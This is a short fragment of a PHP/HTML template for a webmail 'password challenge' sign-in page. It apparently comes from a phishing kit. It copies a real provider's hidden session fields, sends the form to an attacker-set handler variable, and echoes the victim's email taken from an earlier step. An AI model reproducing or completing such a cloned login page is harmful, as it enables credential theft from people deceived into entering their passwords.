                    ...
                    <div class="challenge password-challenge">
                        ...
                        <div id="password-challenge" class="primary">
                            ...
                            <form action="<?php echo $proc; ?><?php if(isset($eshow)){echo $eshow;};?>" method="post" class="challenge-form">
                                <input type="hidden" name="crumb" value="vQYFNoVr5Yu"><input type="hidden" name="acrumb" value="cAqgl2uC"><input type="hidden" name="sessionIndex" value="QQ--"><input type="hidden" name="<?php echo $ename; ?>" value='<?php echo $_SESSION['email']; ?>'>
